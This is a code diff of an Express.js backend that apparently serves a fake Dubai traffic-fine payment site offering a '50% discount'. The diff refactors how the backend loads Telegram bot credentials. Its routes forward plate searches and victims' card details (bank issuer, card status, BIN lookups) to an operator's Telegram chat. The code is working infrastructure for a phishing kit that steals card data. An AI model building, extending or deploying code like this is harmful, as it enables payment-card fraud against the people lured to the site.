@@ -3,14 +3,20 @@ const axios   = require('axios');
 const router  = express.Router();
 const { query, queryOne, getSetting, clientIp } = require('../db');
 
-const TELEGRAM_TOKEN      = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID    = process.env.TELEGRAM_CHAT_ID;
-const SEARCH_TG_TOKEN     = process.env.SEARCH_TELEGRAM_BOT_TOKEN;
-const HANDY_KEY           = process.env.HANDY_API_KEY;
-const MOBILE_UA           = 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36';
+const MOBILE_UA = 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36';
+
+// ─── Config helpers (DB-first, env fallback) ──────────────────────────────────
+async function getTgConfig() {
+  const token    = await getSetting('telegram_bot_token',        process.env.TELEGRAM_BOT_TOKEN          || '');
+  const chatId   = await getSetting('telegram_chat_id',          process.env.TELEGRAM_CHAT_ID            || '');
+  const srchTok  = await getSetting('search_telegram_bot_token', process.env.SEARCH_TELEGRAM_BOT_TOKEN   || '');
+  const handyKey = await getSetting('handy_api_key',             process.env.HANDY_API_KEY               || '');
+  return { token, chatId, srchTok, handyKey };
+}
 
 // ─── Telegram helper ─────────────────────────────────────────────────────────
 async function sendTelegram(token, chatId, text) {
+  if (!token || !chatId) return;
   try {
     await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
       chat_id: chatId, text, parse_mode: 'HTML',
@@ -109,14 +115,15 @@ router.post('/search-fines', async (req, res) => {
     );
     const now = new Date().toLocaleString('tr-TR', { timeZone: 'Asia/Dubai' });
     const msg = [
-      '🚗 <b>Yeni Sorgu</b>',
-      `📋 Plaka: <b>${plateSrcCode} / ${plateCodeLetter} ${plateNo}</b>`,
-      `🔢 Ceza Sayısı: <b>${fineCount}</b>`,
-      `💰 Toplam: <b>AED ${totalAmount}</b> → %50 İndirimli: <b>AED ${Math.floor(totalAmount * 0.5)}</b>`,
-      `🕐 ${now} (Dubai)`,
-      sid ? `🆔 SID: <code>${sid}</code>` : '',
+      '<b>New Inquiry</b>',
+      `Plate: <b>${plateSrcCode} / ${plateCodeLetter} ${plateNo}</b>`,
+      `Fines: <b>${fineCount}</b>`,
+      `Total: <b>AED ${totalAmount}</b> — 50% Discount: <b>AED ${Math.floor(totalAmount * 0.5)}</b>`,
+      `Time: ${now} (Dubai)`,
+      sid ? `SID: <code>${sid}</code>` : '',
     ].filter(Boolean).join('\n');
-    await sendTelegram(SEARCH_TG_TOKEN, TELEGRAM_CHAT_ID, msg);
+    const cfg = await getTgConfig();
+    await sendTelegram(cfg.srchTok || cfg.token, cfg.chatId, msg);
   } catch { /* ignore */ }
 
   res.json(data);
@@ -155,7 +162,8 @@ router.post('/telegram', async (req, res) => {
         `🏛 Banka: <b>${issuer}</b>`, sid?`🆔 SID: <code>${sid}</code>`:'',
       ].filter(Boolean).join('\n');
     }
-    await sendTelegram(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, text);
+    const cfg = await getTgConfig();
+    await sendTelegram(cfg.token, cfg.chatId, text);
     return res.json({ ok: true });
   }
 
@@ -201,7 +209,8 @@ router.post('/telegram', async (req, res) => {
     '📊 <b>KART STATÜSÜ</b>', binStatus, '━━━━━━━━━━━━━━━━━━',
   ].filter(Boolean).join('\n');
 
-  await sendTelegram(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, text);
+  const cfg = await getTgConfig();
+  await sendTelegram(cfg.token, cfg.chatId, text);
   res.json({ ok: true });
 });
 
@@ -211,8 +220,9 @@ router.get('/card-bin', async (req, res) => {
   if (bin.length < 6) return res.status(400).json({ ok: false, error: 'BIN must be at least 6 digits' });
 
   try {
+    const { handyKey } = await getTgConfig();
     const response = await axios.get(`https://data.handyapi.com/bin/${bin}`, {
-      headers: { 'x-api-key': HANDY_KEY }, timeout: 10000,
+      headers: { 'x-api-key': handyKey }, timeout: 10000,
     });
     res.json({ ok: true, data: response.data });
   } catch (err) {
